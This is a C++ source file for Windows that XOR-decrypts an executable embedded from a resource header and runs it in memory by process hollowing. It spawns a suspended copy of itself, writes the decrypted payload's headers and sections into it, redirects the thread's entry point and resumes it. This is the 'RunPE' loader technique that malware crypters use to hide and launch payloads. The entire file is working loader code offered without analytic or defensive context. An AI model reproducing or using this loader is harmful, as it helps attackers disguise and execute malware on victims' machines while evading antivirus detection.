#include <iostream>
#include <fstream>
#include <Windows.h>
#include <TlHelp32.h>
#include "res.h"

// Runs the loaded binary data
void run(void* data)
{
    // Gets the DOS Header from the provided data
    IMAGE_DOS_HEADER* DOSHeader = PIMAGE_DOS_HEADER(data);

    // Gets the NT Headers from from the data
    IMAGE_NT_HEADERS* NtHeaders = PIMAGE_NT_HEADERS((DWORD)data + DOSHeader->e_lfanew);

    // Declares Process and Startup Information
    PROCESS_INFORMATION processInfo;
    STARTUPINFOA startInfo;

    // Clears out memory, done to make sure there are no weird glitches
    ZeroMemory(&processInfo, sizeof(processInfo));
    ZeroMemory(&startInfo, sizeof(startInfo));

    // Checks to see if the loaded binary is a windows executable
    if (NtHeaders->Signature == IMAGE_NT_SIGNATURE)
    {

        // declare file path string
        char filePath[MAX_PATH];

        // file path to current process
        GetModuleFileNameA(0, filePath, MAX_PATH);

        // Creates new instance of exe but in a suspended state
        if (CreateProcessA(filePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &processInfo))
        {
            // Allocate space for the context
            CONTEXT* context = (LPCONTEXT)VirtualAlloc(NULL, sizeof(context), MEM_COMMIT, PAGE_READWRITE);
            context->ContextFlags = CONTEXT_FULL;

            // Gets the context of the new instance
            if (GetThreadContext(processInfo.hThread, (LPCONTEXT)context))
            {
                // Allocates space for the new executable
                void* imageBase = VirtualAllocEx(processInfo.hProcess, (LPVOID)NtHeaders->OptionalHeader.ImageBase, NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                // Writes the data to the allocated image on the new process
                WriteProcessMemory(processInfo.hProcess, imageBase, data, NtHeaders->OptionalHeader.SizeOfHeaders, NULL);

                // Write all the section headers
                for (int count = 0; count < NtHeaders->FileHeader.NumberOfSections; count++)
                {

                    // Gets the pointer to each section header
                    IMAGE_SECTION_HEADER* sectionHeader = PIMAGE_SECTION_HEADER(DWORD(data) + DOSHeader->e_lfanew + 248 + (count*sizeof(IMAGE_SECTION_HEADER)));

                    // writes our section headers
                    WriteProcessMemory(processInfo.hProcess, LPVOID(DWORD(imageBase) + sectionHeader->VirtualAddress), LPVOID((DWORD)data + sectionHeader->PointerToRawData), sectionHeader->SizeOfRawData, 0);

                }

                // Writes the optional header image base
                WriteProcessMemory(processInfo.hProcess, LPVOID(context->Ebx + 8), LPVOID(&NtHeaders->OptionalHeader.ImageBase), 4, 0);

                 // Move new entry point to eax
                context->Eax = DWORD(imageBase) + NtHeaders->OptionalHeader.AddressOfEntryPoint;

                // Set the new context
                SetThreadContext(processInfo.hThread, LPCONTEXT(context));

                // Resume the thread, now starting at our new executable
                ResumeThread(processInfo.hThread);
            }
        }
    }

}

// Main function
int main(int argc, char *argv[])
{

    // Decrypts the executable 
    for (int i = 0; i < bytesLen; i++)
    {
        bytes[i] = bytes[i] ^ 0x11;
    }

    // Runs the executable in memory
    run((void*) bytes);

    // Waits for input 
    getchar();

}